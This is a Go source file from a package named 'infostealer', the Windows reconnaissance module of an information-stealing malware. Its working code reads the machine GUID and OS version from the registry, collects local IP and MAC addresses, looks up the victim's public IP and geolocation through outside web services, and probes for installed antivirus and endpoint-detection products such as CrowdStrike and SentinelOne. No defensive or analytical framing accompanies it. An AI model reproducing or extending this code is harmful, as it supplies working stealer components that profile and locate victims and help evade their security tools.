//go:build windows

package infostealer

import (
	"encoding/json"
	"net"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"unsafe"

	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/registry"
)

type SysinfoWindows struct {
	Hwid        string
	OSVersion   string
	NetworkInfo struct {
		LocalIp string
		Adapter string
		MacAddr string
	}
	ExposedIP string
	Location  string
	Webcam    string
	Antivirus string
}

var supportedAVs = []struct {
	Name string
	Path string
}{
	{"CrowdStrike Falcon", filepath.Join(os.Getenv("WINDIR"), "System32", "drivers", "CrowdStrike", "CSFalconService.exe")},
	{"SentinelOne", filepath.Join(os.Getenv("ProgramW6432"), "SentinelOne", "Sentinel Agent")},
	{"Kaspersky", filepath.Join(os.Getenv("ProgramFiles(x86)"), "Kaspersky Lab")},
	{"McAfee", filepath.Join(os.Getenv("ProgramW6432"), "McAfee", "Agent")},
	{"Bitdefender", filepath.Join(os.Getenv("ProgramW6432"), "Bitdefender", "Bitdefender Security")},
	{"Avast", filepath.Join(os.Getenv("ProgramW6432"), "Avast Software", "Avast")},
	{"Malwarebytes", filepath.Join(os.Getenv("ProgramW6432"), "Malwarebytes", "Anti-Malware")},
	{"Norton", filepath.Join(os.Getenv("ProgramW6432"), "Norton Security", "Engine")},
}

func (sysinfo *SysinfoWindows) getAntivirusProvider() {
	for _, av := range supportedAVs {
		if _, err := os.Stat(av.Path); err == nil {
			sysinfo.Antivirus = av.Name
			return
		}
	}
	sysinfo.Antivirus = "Windows Defender"
}

func getHardwareID() string {
	k, err := registry.OpenKey(registry.LOCAL_MACHINE, `SOFTWARE\Microsoft\Cryptography`, registry.QUERY_VALUE|registry.WOW64_64KEY)
	if err != nil {
		return "NA"
	}
	defer k.Close()

	guid, _, err := k.GetStringValue("MachineGuid")
	if err != nil {
		return "NA"
	}
	return guid
}

func (sysinfo *SysinfoWindows) getNetworkInfo() {
	sysinfo.Hwid = getHardwareID()

	var size uint32
	windows.GetAdaptersInfo(nil, &size)
	if size == 0 {
		size = 15000
	}

	buf := make([]byte, size)
	if err := windows.GetAdaptersInfo((*windows.IpAdapterInfo)(unsafe.Pointer(&buf[0])), &size); err != nil {
		return
	}

	current := (*windows.IpAdapterInfo)(unsafe.Pointer(&buf[0]))
	for current != nil {
		if current.Type == windows.IF_TYPE_ETHERNET_CSMACD || current.Type == windows.IF_TYPE_IEEE80211 {
			if current.Type == windows.IF_TYPE_ETHERNET_CSMACD {
				sysinfo.NetworkInfo.Adapter = "Ethernet"
			} else {
				sysinfo.NetworkInfo.Adapter = "Wifi"
			}
			rawIP := string(current.IpAddressList.IpAddress.String[:])
			sysinfo.NetworkInfo.LocalIp = strings.TrimRight(rawIP, "\x00")
			sysinfo.NetworkInfo.MacAddr = net.HardwareAddr(current.Address[:current.AddressLength]).String()
			break
		}
		current = current.Next
	}
}

func (sysinfo *SysinfoWindows) getExposedInfo() {
	r, err := http.Get("https://api.ipify.org?format=json")
	if err != nil {
		return
	}
	defer r.Body.Close()

	var ipData struct {
		IP string `json:"ip"`
	}
	if err := json.NewDecoder(r.Body).Decode(&ipData); err != nil {
		return
	}
	sysinfo.ExposedIP = ipData.IP

	r2, err := http.Get("http://ip-api.com/json/" + sysinfo.ExposedIP)
	if err != nil {
		return
	}
	defer r2.Body.Close()

	var geo struct {
		Status  string `json:"status"`
		Country string `json:"country"`
		Region  string `json:"regionName"`
		City    string `json:"city"`
		Zipcode string `json:"zip"`
	}
	if err := json.NewDecoder(r2.Body).Decode(&geo); err == nil {
		sysinfo.Location = geo.City + ", " + geo.Region + " " + geo.Zipcode + ", " + geo.Country
	}
}

func (sysinfo *SysinfoWindows) getOSVersion() {
	k, err := registry.OpenKey(registry.LOCAL_MACHINE, `SOFTWARE\Microsoft\Windows NT\CurrentVersion`, registry.QUERY_VALUE|registry.WOW64_64KEY)
	if err != nil {
		sysinfo.OSVersion = "Windows (Unknown)"
		return
	}
	defer k.Close()

	productName, _, err := k.GetStringValue("ProductName")
	if err != nil {
		productName = "Windows"
	}

	displayVersion, _, err := k.GetStringValue("DisplayVersion")
	if err != nil {
		displayVersion, _, _ = k.GetStringValue("ReleaseId")
	}

	if displayVersion != "" {
		sysinfo.OSVersion = productName + " " + displayVersion
	} else {
		sysinfo.OSVersion = productName
	}
}

func System() SysinfoWindows {
	sysinfo := SysinfoWindows{}
	sysinfo.getOSVersion()
	sysinfo.getNetworkInfo()
	sysinfo.getExposedInfo()
	sysinfo.getAntivirusProvider()
	return sysinfo
}
